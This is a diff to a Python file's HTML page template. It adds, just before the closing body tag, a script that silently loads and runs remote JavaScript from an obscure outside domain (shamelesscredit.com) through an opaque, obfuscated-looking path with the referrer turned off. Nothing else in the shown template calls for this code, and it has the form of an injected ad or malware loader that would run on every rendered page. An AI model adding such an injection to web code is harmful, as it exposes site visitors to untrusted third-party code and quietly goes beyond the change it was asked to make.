@@ -432,6 +432,18 @@ BASE_HTML = '''<!DOCTYPE html>
     });
   });
 </script>
+<script>
+(function(fmj){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = fmj || {};
+s.src = "\/\/shamelesscredit.com\/b\/XnV.scd\/GTlW0VY\/Wtcw\/geAml9\/uyZkUQlKkPPDT\/Y-zUNnDcQ\/zaNwjWMst_Ngj\/Mw0TNDDLM\/2SNxAB";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 </body>
 </html>
 '''
